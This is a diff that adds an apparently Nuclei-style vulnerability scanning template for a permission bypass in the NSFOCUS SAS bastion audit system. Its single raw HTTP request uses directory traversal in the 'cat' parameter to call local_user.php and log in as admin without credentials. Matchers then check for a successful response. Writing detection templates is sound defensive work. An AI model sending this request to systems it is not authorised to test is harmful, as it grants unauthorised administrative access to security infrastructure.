@@ -1,0 +1,28 @@
+id: nsfocus-bastion-local-user-permission-bypass
+
+info:
+  name: NSFOCUS Bastion Local User Permission Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The SAS security audit system by NSFOCUS has a permission bypass vulnerability
+    in the local_user.php file. Attackers can gain access to sensitive resources
+    that they would not normally have access to, leaving the system in a highly
+    insecure state.
+  tags: permission-bypass
+
+http:
+  - raw:
+      - |
+        GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"status":200'
+        part: body
